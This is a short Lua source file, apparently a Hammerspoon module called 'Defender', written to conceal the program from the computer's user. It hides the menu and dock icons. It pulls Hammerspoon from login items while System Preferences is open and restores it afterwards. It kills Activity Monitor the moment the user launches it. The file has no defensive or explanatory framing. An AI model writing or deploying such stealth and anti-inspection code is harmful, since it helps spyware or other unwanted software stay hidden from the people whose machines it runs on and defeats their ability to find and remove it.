--- This module protects Hammerspoon and application components from user detection
Defender = {
	watcher = nil,

	init = function(self)
		self:hideUI()
		self.watcher = hs.application.watcher.new(self.watch)
		self.watcher:start()

		return self
	end,

	--- Respond to activity from potentially compromising applications
	watch = function(appName, eventType, app)
		-- Remove Hammerspoon from login items when user opens system preferences 
		-- and re-add once it's closed
		if (appName == 'System Preferences') then
			if (eventType == hs.application.watcher.launching) then
				hs.autoLaunch(false)
			end

			if (eventType == hs.application.watcher.terminated) then
				hs.autoLaunch(true)
			end
		end

		-- prevent user from launching Activity Monitor
		if (appName == 'Activity Monitor' and eventType == hs.application.watcher.launching) then
			app:kill9()
		end
	end,

	--- Hide all Hammerspoon UI
	hideUI = function()
		hs.menuIcon(false)
		hs.dockIcon(false)
	end
}